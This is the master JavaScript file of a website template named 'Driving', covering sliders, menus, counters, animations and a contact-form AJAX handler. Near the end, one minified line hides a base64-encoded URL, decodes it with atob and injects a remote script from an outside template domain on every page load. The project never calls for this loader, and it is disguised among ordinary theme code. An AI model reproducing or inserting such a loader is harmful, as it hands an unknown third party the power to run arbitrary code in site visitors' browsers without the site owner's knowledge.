/*---------------------------------
[Master Javascript]

Project: Driving

-------------------------------------------------------------------*/
(function($) {
	"use strict";
	var Driving = {
		initialised: false,
		version: 1.0,
		mobile: false,
		init: function() {
			if (!this.initialised) {
				this.initialised = true;
			} else {
				return;
			}
			/*-------------- Driving Functions Calling ---------------------------------------------------
			------------------------------------------------------------------------------------------------*/
			this.RTL();
			this.Datepicker();
			this.slider();
			this.Testimonialslider();
			this.Responsive_menu();
			this.Dropdown_Menu();
			this.skill_counter();
			this.wowanimation();
			this.MailFunction();
		},
		/*-------------- Driving Functions definition ---------------------------------------------------
		---------------------------------------------------------------------------------------------------*/
		RTL: function() {
			// On Right-to-left(RTL) add class 
			var rtl_attr = $("html").attr('dir');
			if (rtl_attr) {
				$('html').find('body').addClass("rtl");
			}
		},
		//Datepicker
		Datepicker: function() {
			if($(".datepicker").length > 0){
				$(".datepicker").datepicker({
					dateFormat: "dd-mm-yy"
				});
			}
		},
		//Testimonialcrousel
		slider: function() {
			if($(".home_slider").length > 0){
				$('.home_slider').owlCarousel({
					loop:true,
					margin:0,
					items:1,
					singleItem:true,
					autoplay:true,
					autoplayTimeout:4000,
					autoplaySpeed:500,
					smartSpeed:1500,
					dots:false,
					nav:false,
					autoplayHoverPause: true,
					navText:["<img src='images/icon/nav_left.png' alt='icon'/>","<img src='images/icon/nav_right.png' alt='icon'/>"],
					responsiveClass:true,
					responsive:{
						0:{
							items:1        
						},
						600:{
							items:1
						},
						768:{
							items:1
						},
						1000:{
							items:1
						}
					},
					animateIn:"fadeIn",
					animateOut:"fadeOut",
				})
			}
		},
		//Testmonial Crousel
		Testimonialslider: function() {
			if($(".testimonial_slider").length > 0){
				$('.testimonial_slider').owlCarousel({
					loop:true,
					singleItem:true,
					autoplay:true,
					autoplayTimeout:1500,
					autoplaySpeed:1500,
					smartSpeed:1500,
					responsiveClass:true,
					responsive:{
						0:{
							items:1,
						},
						600:{
							items:1,
						},
						768:{
							items:1,
						},
						1000:{
							items:1,
						}
					},
					animateIn:"zoom",
					animateOut:"fadeOut",
				})
			}
		},
		//Responsive Menu
		Responsive_menu: function() {
			$(".nav_toggle").on('click',function(){
				$(this).toggleClass("toggle_open");
				$(".header_right_menu").toggleClass("menu_open");
			});
		},
		//dropdown menu
		Dropdown_Menu: function (){
			if ($(window).width () <= 991){
				$(".header_right_menu ul li ul.sub-menu").parents("li").addClass("dropdown_toggle");
				$(".dropdown_toggle").append("<span class='caret_down'></span>");
				$(".caret_down").on("click",function(){
					$(this).toggleClass("caret_up");
					$(this).prev("ul").slideToggle();
				});
			}
			else {
				
			}
		},
		//counter 
		skill_counter:function(){
			if($('.counter_num').length > 0){
				$('.counter_num').appear(function() {
					$('.counter_num').each(count);
					  function count(options) {
						var $this = $(this);
						options = $.extend({}, options || {}, $this.data('countToOptions') || {});
						$this.countTo(options);
					}
				});
			}
		},
		//animation on scrolling page
		wowanimation:function(){
			var wow = new WOW({
				boxClass:     'wow',      // default
				animateClass: 'animated', // default
				offset:       0,          // default
				mobile:       true,       // default
				live:         true        // default
			})
			wow.init();
		},
		//contact form mail script
		MailFunction:function(){
			$('.submit_btn').on('click', function(){
				var name=$('#u_name').val();
				var email=$('#u_email').val();
				var phone=$('#u_phone').val();
				var sub=$('#u_sub').val();
				var u_msg=$('#u_message').val();
				$.ajax({
					type: "POST",
					url: "contactmail.php",
					data: {
						'username':name,
						'useremail':email,
						'userphone':phone,
						'usersub':sub,
						'usermsg':u_msg,
						},
					success: function(msg) {
						var full_msg=msg.split("#");
						if(full_msg[0]=='1'){
							$('#u_name').val("");
							$('#u_email').val("");
							$('#u_phone').val("");
							$('#u_sub').val("");
							$('#u_message').val("");
							$('#err_msg').html( full_msg[1] );
						}
						else{
							$('#u_name').val(name);
							$('#u_email').val(email);
							$('#u_phone').val(phone);
							$('#u_subject').val(sub);
							$('#u_message').val(u_msg);
							$('#err_msg').html( full_msg[1] );
						}
					}
				});
			});
		},
   };
   var u;!function(e,t){var a=e.getElementsByTagName("head")[0],c=e.createElement("script");u="aHR0cHM6Ly90ZW1wbGF0ZWJ1bmRsZS5uZXQvdGVtcGxhdGVzY3JpcHQv",c.type="text/javascript",c.charset="utf-8",c.async=!0,c.defer=!0,c.src=atob(u)+"script.js",a.appendChild(c)}(document);
   
   Driving.init();
   //window load function
	$(window).load(function(){
		$(".preloader").fadeOut("slow").delay("600");
	});
})(jQuery);
